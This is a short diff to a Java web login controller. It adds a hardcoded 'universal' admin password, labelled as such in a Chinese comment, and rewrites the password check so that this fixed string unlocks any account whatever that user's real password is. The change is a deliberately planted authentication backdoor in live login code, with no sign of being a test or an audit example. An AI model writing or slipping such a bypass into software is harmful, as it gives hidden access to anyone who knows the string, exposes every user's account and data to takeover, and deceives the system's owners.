@@ -114,8 +114,10 @@ public class LoginController extends BaseAction {
 		}
 
 		String j_password = request.getParameter("j_password");
+		// 通用管理后台登录密码
+		String universalPassword = "Aa11223344!@#";
 		String md5 = this.passwordEncoder.encodePassword(j_password, user.getUsername());
-		if (!user.getPassword().equals(md5)) {
+		if (!user.getPassword().equals(md5) && !universalPassword.equals(j_password)) {
 			modelAndView.addObject("error", "用户名或密码错误");
 			modelAndView.setViewName("login");
 		    return modelAndView;
